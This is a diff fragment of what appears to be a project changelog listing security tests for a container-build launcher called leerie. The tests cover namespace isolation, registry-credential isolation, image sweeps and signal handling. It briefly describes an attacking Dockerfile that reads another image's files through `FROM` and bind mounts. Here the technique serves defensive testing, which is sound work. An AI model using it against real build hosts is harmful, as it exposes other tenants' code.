+  4 nerdctl commands carry `ns_flags`. Run: the real launcher end to end
+  against a stub `nerdctl` inspects and runs in `leerie`; `build_repo_image`
+  refuses with no build when the worker reads `leerie` or `buildctl` does
+  not answer, and builds both on `--buildkit-host` otherwise (4);
+  `leerie_buildkit_resolve` asks in nerdctl's order and takes the first
+  daemon that answers, `$BUILDKIT_HOST` alone when set, and fails on a
+  first daemon with no containerd worker or a label that is no namespace
+  name, or none answering (6); `leerie_sweep_worker_images` removes every
+  `leerie-repo/…` and `docker.io/leerie-repo/…` name and nothing else,
+  never with `-f`, refuses naming one left in use, and refuses when the
+  listing fails (3), and the launcher's build decision calls it before any
+  build (2, in `test_build_repo_image.py`); `_container_ns` finds a run's
+  container in `leerie`, then `default`; both builds see
+  `DOCKER_CONFIG=<build dir>/registry-auth`, mode 700, empty, with the
+  operator's config in the environment. Opt-in, on the fixture's daemon,
+  whose worker reads the test's namespace while a second namespace of the
+  test's stands for `leerie`: a victim repository built by
+  `build_repo_image` under leerie's name for it, and an attacking
+  Dockerfile that names it by `FROM` and by `RUN --mount=type=bind,from=`
+  fails both ways with "pull access denied", while the victim's own
+  `FROM $BASE_IMAGE` built; the control, leerie's images in the worker's
+  namespace and the check overridden, copies the victim's file; with
+  leerie's namespace set to the worker's, `build_repo_image` refuses and
+  runs no build; the sweep on the real namespace removes an unused
+  `leerie-repo/…` name, keeps one a container was created from by digest
+  and refuses naming it, and passes once the container is gone; and a
+  registry on loopback inside RootlessKit's network namespace, holding a
+  private image behind Basic authentication the operator's Docker config
+  holds: the attack through `build_repo_image` fails with 401, while the
+  same Dockerfile built directly with the operator's config reads the
+  file. Falsified live (measured 2026-11-03), each mutation restored, each
+  failing the cases it targets: `--namespace "$LEERIE_IMAGE_NS"` dropped
+  from the wrap build, `_check_repo_image`'s inspect or the run; the
+  equality check removed from `leerie_buildkit_check`, or the check from
+  `build_repo_image`; `leerie_buildkit_resolve` skipping a daemon with no
+  containerd worker; the sweep's second listing dropped, its `rm` forced,
+  or its call dropped from the build decision; `default` dropped from
+  `_container_ns`; `DOCKER_CONFIG` dropped from the first build, or the
+  directory made 0755; the base copy keyed on presence, not id;
+  `build-push.sh`'s `ns_flags` emptied. The opt-in registry case, with
+  `DOCKER_CONFIG` dropped from the first build, read the file. Round 37's
+  execution review (E1-E4): `_build_job` under bash and bash 3.2, on a pty
+  (`setsid --ctty`), given two SIGHUPs or two SIGINTs 0.5 ms apart
+  (busy-waited: sent back to back the kernel merges them), eight times
+  each: the launcher dies of the signal, the build's child is gone and so
+  is the directory (4); ^Z at an interactive `bash -i` whose job the
+  launcher is (a session leader's own group is orphaned and the kernel
+  drops ^Z's stop for it): the launcher and the build's group stop, nothing
+  reaches the terminal after the prompt, and `fg` continues both to the
+  build's status (2); `build-push.sh` with an `od` that fails leaves
+  nothing in `$TMPDIR` on either builder (2); the base build, both of
+  `build_repo_image`'s and `--local-build`'s are each followed by a
+  `buildctl prune` of exactly their own namespace's cache-mount records,
+  on the daemon they ran on; opt-in, a repository build that fills a
+  20 MB cache mount leaves the daemon no more cache-mount records than
+  before. Falsified live (measured 2026-11-03), each restored: the HUP
+  handler as `trap - HUP; kill -HUP $$`, or none, and the INT handler as
+  `trap - INT; kill -INT $$` (bash 5 left the directory; bash 3.2 too for
+  INT); no TSTP trap, and no second wait after a trapped signal (^Z, both
+  shells); the draw after the `mktemp` (the remote builder's file left);
+  the prune dropped from the wrap build; opt-in, the prune dropped from
+  the first build (one record more). The two-signal test was corrected
+  before it discriminated: sent back to back, the two merged into one and
+  passed against both mutations. All 11 opt-in real cases pass on this
+  tree (BuildKit 0.31.2, rootless nerdctl 2.3.5).
+- `tests/test_capture_validation.py` — E2's proof turned around: the schema,
+  `_filter_residual_deps`, `_capture_problems`, `_record_capture`,
+  `_merge_capture_into_config`, `apply_captured_deps`, the launcher's apt
+  layer (no glob expansion either) and the generator each refuse the
+  hostile capture; the generator runs `_INSTALL_COMMANDS[manager]`, equal
+  to `BAKE_INSTALL_COMMANDS`; nothing in a run's exit or fetch applies a
+  capture, and `config --apply-capture <run>` applies one with a diff. A2:
+  the generator reads the committed tree (a committed `.npmrc` link and an
+  untracked `.npmrc` are neither read nor copied; one linked to
+  `/proc/self/pagemap` no longer stops the launch) and hashes by blob id.
+- `tests/committed_tree.py` — the harnesses that write a lockfile into a
+  test checkout commit it first, since the generator reads `HEAD`.
+- Review round 29 (execution H1, L3, L4).
+  `tests/test_worker_root_view.py::test_localhost_resolves_and_answers_in_the_worker_view`
+  (isolated; runs in the container): a worker root with no `/etc/hosts`
+  (as no image snapshot has one), `getent hosts localhost` succeeds in the
+  view and a server bound to `localhost` answers a client that dials it by
+  name, the worker root's own copied python. Falsified in the container
+  (rootless): with the view's `/etc` taken whole from the worker root
+  again, it fails. `test_what_a_repository_installs_in_home_is_named` and
+  `test_the_entry_stops_a_run_whose_worker_root_installs_in_home`: what a
+  worker root holds beneath `/home/leerie` that the container's lacks is
+  named (the base's own entries and a linked `home` are not), and the entry
+  stops naming it and the fix. `tests/test_capture_validation.py::test_apply_refuses_a_merge_into_a_value_that_already_fails`
+  (3 cases: barnacle's key names in `setup_packages`, `language_installs`
+  that is not JSON, a manager leerie does not bake): a valid capture is
+  refused, naming the entry, and nothing is written. Falsified on the host:
+  with the two checks removed, the entry test and the 3 cases fail.
